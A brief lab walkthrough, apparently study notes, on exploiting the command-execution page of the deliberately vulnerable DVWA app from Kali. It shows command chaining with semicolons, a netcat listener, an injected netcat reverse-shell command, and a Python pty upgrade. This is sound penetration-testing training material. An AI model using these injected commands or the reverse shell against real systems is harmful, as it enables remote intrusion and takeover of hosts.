- When you open the DVWA in your kali bowser with the IP of your metasploitable, go to the code execution section.
- We can execute commands one after another in one go like this : 
```
ping 192.168.14.5 -c 5 ; echo"Hello World"
```
- We can use ; this to give multiple commands at once and they will all execute one by one and there's a way to exploit the code execution section of the DVWA using this method.
- Open command prompt 
```
netcat -lvnp 2345
```
- Search for Reverse Shell cheat sheet pentestmonkey on your browser.
- There you will find one line commands for many language's but we will be using netcat one.
- Same way as before we will be adding our IP of Kali and the port in which we are listening in the command, it will look something like this :
```
ping 0.0.0.0 ; nc -e /bin/sh 10.0.0.1 2345
(Some more commands which you can use in the code execution page)
ping 0.0.0.0 ; ls
ping 0.0.0.0 ; touch hi.txt
ping 0.0.0.0 ; echo Hello Hello Hello > hi.txt
ping 0.0.0.0 ; cat hi.txt
(to make the shell look a bit more user friendly you can use the same command as before)
python -c 'import pty; pty.spawn("/bin/sh")'
```
